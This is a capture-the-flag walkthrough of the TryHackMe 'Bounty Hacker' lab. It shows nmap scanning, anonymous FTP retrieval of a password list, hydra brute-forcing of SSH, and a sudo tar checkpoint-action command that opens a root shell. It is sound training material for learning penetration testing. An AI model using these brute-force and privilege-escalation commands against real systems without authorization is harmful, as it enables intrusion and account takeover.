# TryHackMe | Bounty Hacker

[Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## Deploy the Machine

The instructions are pretty clear for this one. SMASH THAT GREEN BUTTON!!!

## Find open ports on the machine

We will use nmap to do a quick scan of the machine for open ports.

```bash
❯ nmap -sV $IP
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## Who wrote the task list?

To find out who wrote it, we first have to find the task list itself. Let's check the hint for this task, which is "Have you visited FTP?". First let's check if anonymous login is enabled for ftp. Yes it is. Great, now we can copy over the text files we find to our system using the get command.

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp>

```

Now let's see the contents of the task.txt.

```bash
❯ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

We can see that the rather surreal sounding tasks have been written by "lin". This may potentially be a username that can be used later.

Let's look into locks.txt now. Looks like it is a list of passwords. It'll come in handy while brute-forcing the password.

```bash
❯ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

## What service can you bruteforce with the text file found?

Now let's take a look at the hint for the next task. "What is on port 22?". SSH.

Let's brute force the ssh port using hydra. We use lin as the username and the retrieved locks.txt as our wordlist.

```bash
❯ hydra -l lin -P locks.txt $IP ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[22][ssh] host: 10.10.246.11   login: lin   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found

```

Okay, we have the password now. Let's try to ssh into the machine using these credentials.

![hacker-voice-im-in-9461453.png](images/hacker-voice-im-in-9461453.png)

Lets look around the system for a bit. On checking the home directory, we find the user.txt. Well, that was easy.

```bash
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
[DATA EXPUNGED]

```

Now to find root.txt, we have to escalate our privileges and gain root access to the system. To get started, we type sudo -l to see what commands our current user can run as root.

```bash
lin@bountyhacker:~/Desktop$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

As we can see, lin can run /bin/tar as root. Lets head over to [GTFOBins](https://gtfobins.github.io/) and look for an exploit for this binary that can help us break out and gain a root shell. On searching for tar on the site, we get the following command.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Lets pop that into the shell and see what happens. Hmm, it seems we have successfully gained root access.

Now we use the find command to locate root.txt.

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/` from member names
# whoami
root
# find / -name "root.txt" 2>/dev/null
/root/root.txt
# cat /root/root.txt
[DATA EXPUNGED]

```

So there you have it. We have finally completed the room. This was an easy room, so beginners like me shouldn't have much problems with it. If you couldn't do it by yourself though, don't lose hope, the path is full of learning opportunities. Hope you learned something new today. Adios.
